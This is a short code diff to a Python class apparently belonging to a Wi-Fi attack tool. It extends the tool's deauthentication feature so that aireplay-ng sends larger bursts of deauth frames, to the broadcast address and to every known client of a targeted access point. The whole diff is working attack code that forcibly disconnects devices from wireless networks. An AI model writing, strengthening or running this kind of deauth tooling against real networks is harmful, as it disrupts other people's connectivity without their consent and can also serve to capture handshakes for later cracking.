@@ -334,20 +334,26 @@ class WifiAttackView:
     def _do_deauth(self) -> None:
         if not self.mon_iface or not self.targeted_ap:
             return
-        cmd = [
-            "aireplay-ng", "--deauth", "5",
-            "-a", self.targeted_ap.bssid,
-        ]
+            
+        target_macs = []
         if self.client_cursor > 0 and self.client_cursor - 1 < len(self.clients):
-            cmd += ["-c", self.clients[self.client_cursor - 1].mac]
-        cmd.append(self.mon_iface)
+            target_macs.append(self.clients[self.client_cursor - 1].mac)
+        else:
+            target_macs.append(None)  # Broadcast
+            target_macs.extend([c.mac for c in self.clients])
 
         def _worker():
             try:
-                subprocess.run(cmd, stdout=subprocess.DEVNULL,
-                               stderr=subprocess.DEVNULL, timeout=10)
+                for mac in target_macs:
+                    cmd = ["aireplay-ng", "--deauth", "20", "-a", self.targeted_ap.bssid]
+                    if mac:
+                        cmd += ["-c", mac]
+                    cmd.append(self.mon_iface)
+                    subprocess.run(cmd, stdout=subprocess.DEVNULL,
+                                   stderr=subprocess.DEVNULL, timeout=15)
+                    
                 self.deauth_count += 1
-                self.status_msg = f"Deauth sent ({self.deauth_count})"
+                self.status_msg = f"Deauth burst sent ({self.deauth_count})"
             except FileNotFoundError:
                 self.status_msg = "aireplay-ng not installed"
             except Exception as e:
